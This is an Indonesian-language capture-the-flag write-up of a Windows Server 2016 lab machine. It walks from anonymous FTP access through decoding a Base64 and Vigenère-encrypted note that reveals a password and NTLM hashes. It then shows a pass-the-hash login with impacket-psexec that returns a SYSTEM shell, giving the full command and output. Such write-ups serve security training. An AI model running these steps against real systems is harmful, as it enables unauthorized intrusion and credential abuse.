

> _"One of my childhood joys is when you find a ticket that leads you to the rides indefinitely until the playground closes."_

---

## Ringkasan

|Item|Detail|
|---|---|
|Target|10.1.2.123|
|OS|Windows Server 2016 (10.0.14393)|
|Kesulitan|Medium|
|Teknik Utama|FTP Anonymous, Vigenère Cipher, Pass-the-Hash|

---

## 1. Reconnaissance

Dari hasil scan ditemukan beberapa port terbuka:

```bash
21/tcp   - FTP (Microsoft ftpd) — Anonymous login allowed
80/tcp   - HTTP (Microsoft IIS 10.0) + WebDAV
445/tcp  - SMB (Windows Server 2008 R2 - 2012)
8081/tcp - Dup Scout Enterprise v10.0.18
135/tcp  - MSRPC
```

Hal pertama yang menarik perhatian adalah hostname `ARIADNE` yang bocor dari SSL certificate pada port 21. Informasi ini akan berguna sebagai kunci enkripsi nantinya.

---

## 2. FTP Anonymous Login

Port 21 mengizinkan anonymous login tanpa credential apapun.

```bash
ftp 10.1.2.123
# Username: anonymous
# Password: (kosong)
```

Di dalam FTP ditemukan folder `backup` yang berisi dua file:

- file `.zip`
- `notes.txt`

---

## 3. Decoding notes.txt

Isi `notes.txt`:

```text
this is a reminder for me and for internal use only.
securing the message with encryption (hint for myself: french diplomat)
hostname as the house key.

CnVqbXIgbGYgZnV1cSwgcGRmd3dmemQgTW5vYWliQDEyMzQ1Cg...
```

Dua clue penting dari notes:

- **"french diplomat"** → Blaise de Vigenère → **Vigenère Cipher**
- **"hostname as the house key"** → key = **ARIADNE**

### Langkah decode:

**Step 1 — Base64 decode:**

```bash
echo "CnVqbXIgbGYgZnV1..." | base64 -d
```

**Step 2 — Vigenère decrypt** dengan key `ARIADNE`:

Hasil akhir:

```
user is budi, password Jakart@12345

administrator:aad3b435b51404eeaad3b435b51404ee:be101f8504138d8c37932dc442be6590
budi:aad3b435b51404eeaad3b435b51404ee:2f1b796d9cba86a4c93b76f8fbc37cef
```

Format baris kedua dan ketiga adalah **NTLM hash** dengan struktur:

```
username:LM_hash:NT_hash
```

---

## 4. SMB Enumeration

Dengan credential `budi:Jakart@12345`
Tetapi tidak ada yang bisa dieksploitasi lebih jauh



---

## 5. Pass-the-Hash → Shell

Karena sudah memiliki NTLM hash milik `administrator`, tidak perlu crack password. Windows menggunakan hash langsung untuk autentikasi sehingga teknik **Pass-the-Hash** bisa digunakan.

```bash
impacket-psexec \
  -hashes aad3b435b51404eeaad3b435b51404ee:be101f8504138d8c37932dc442be6590 \
  administrator@10.1.2.123
```

Output:

```
[*] Requesting shares on 10.1.2.123.....
[*] Found writable share ADMIN$
[*] Uploading file ZuVzkzYn.exe
[*] Opening SVCManager on 10.1.2.123.....
[*] Creating service znNm on 10.1.2.123.....
[*] Starting service znNm.....
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Shell diperoleh sebagai **NT AUTHORITY\SYSTEM**.

---

## 6. Flag

```cmd
C:\Users\Administrator\Desktop> type root.txt
C:\Users\budi\Desktop> type user.txt
```

---

## Kill Chain

```
FTP Anonymous Login
        ↓
  notes.txt (backup)
        ↓
  Base64 decode
        ↓
  Vigenère decrypt (key: ARIADNE)
        ↓
  NTLM hash administrator
        ↓
  Pass-the-Hash via impacket-psexec
        ↓
  NT AUTHORITY\SYSTEM
```